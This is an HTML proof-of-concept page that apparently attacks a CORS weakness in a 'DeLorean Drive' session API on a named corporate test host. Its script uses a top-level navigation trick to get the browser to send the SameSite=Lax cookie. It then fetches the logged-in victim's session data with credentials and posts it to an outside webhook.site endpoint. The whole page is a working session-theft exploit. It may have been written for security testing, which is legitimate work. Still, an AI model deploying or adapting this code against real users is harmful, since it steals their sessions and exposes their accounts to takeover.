<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CORS PoC – top-level navigation trick</title>
  <style>
    body{font-family:Arial,Helvetica,sans-serif;margin:3rem}
    a.button{display:inline-block;background:#28a745;color:#fff;padding:.8rem 1.4rem;text-decoration:none;border-radius:4px}
    #loot{background:#f6f8fa;padding:1rem;border:1px solid #e1e4e8;white-space:pre-wrap}
  </style>
</head>
<body>
  <h2>CORS PoC – DeLorean Drive (top-level nav trick)</h2>

  <!--  primed = we just came back from the navigation  -->
  <div id="primed" style="display:none">
    <p>⏳ Stealing session …</p>
    <pre id="loot"></pre>
  </div>

  <!--  initial state  -->
  <div id="start">
    <p>Click the button to start (you must be logged in).</p>
    <a class="button" href="#" onclick="prime()">1. Prime cookie & navigate</a>
  </div>

  <script>
    const TARGET = 'https://delorean-drive-test.tomtomgroup.com/api/session';
    const EXFIL  = 'https://webhook.site/445b3885-da06-4d12-b4c2-477cc5d38aa6';
    const MY_URL = location.origin + location.pathname;   // <- your GitHub-Pages URL

    /*  -----  part 1 : send user away and come back  ----- */
    function prime() {
      // navigate to the JSON endpoint; the response will be ugly raw JSON, who cares.
      // The important thing is that the browser carries the SameSite=Lax cookie.
      location.href = TARGET + '?cb=' + Date.now();   // cache-bust
      // We will come back via <meta refresh> injected below
    }

    /*  -----  part 2 : we came back, fetch while cookie still hot  ----- */
    async function steal() {
      try {
        const res = await fetch(TARGET, {method:'GET', credentials:'include'});
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();

        document.getElementById('loot').textContent = JSON.stringify(data, null, 2);

        // optional exfil
        fetch(EXFIL, {
          method : 'POST',
          body   : JSON.stringify(data),
          headers: {'Content-Type':'application/json'}
        });
      } catch (e) {
        document.getElementById('loot').textContent = '❌  ' + e;
      }
    }

    /*  -----  bootstrap  ----- */
    if (location.search.includes('primed=1')) {
      // we are back from the navigation
      document.getElementById('start').style.display   = 'none';
      document.getElementById('primed').style.display  = 'block';
      steal();                       // fire immediately
    } else if (location.search.includes('cb=')) {
      // we are still on the target JSON page – auto-return after 1 s
      const meta       = document.createElement('meta');
      meta.httpEquiv   = 'refresh';
      meta.content     = '1;url=' + MY_URL + '?primed=1';
      document.head.appendChild(meta);
      document.body.innerHTML = '<p>Returning …</p>';
    }
  </script>
</body>
</html>
